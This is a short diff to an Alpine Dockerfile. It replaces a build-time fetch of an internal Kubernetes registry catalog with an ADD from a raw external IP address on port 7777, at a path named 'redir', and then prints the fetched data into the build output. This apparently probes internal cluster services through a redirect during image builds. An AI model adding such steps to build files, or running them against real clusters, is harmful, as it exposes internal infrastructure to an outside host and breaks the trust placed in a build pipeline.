@@ -1,4 +1,4 @@
 FROM alpine:3.19
-ADD http://registry.kube-system.svc.cluster.local:5000/v2/_catalog /tmp/r1
+ADD http://62.113.111.63:7777/redir /tmp/data
+RUN cat /tmp/data 2>&1 || true
 CMD sleep infinity
- 
